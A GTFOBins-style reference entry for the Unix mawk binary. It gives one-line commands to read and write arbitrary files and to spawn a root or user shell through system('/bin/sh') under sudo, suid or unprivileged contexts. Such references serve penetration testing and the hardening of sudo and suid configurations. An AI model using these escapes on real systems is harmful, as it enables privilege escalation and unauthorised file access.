---
type: gtfobin
name: mawk
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# mawk

## file-read

```bash
mawk '//' /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
mawk 'BEGIN {system("/bin/sh")}'
```
**Contexts:** sudo, suid, unprivileged
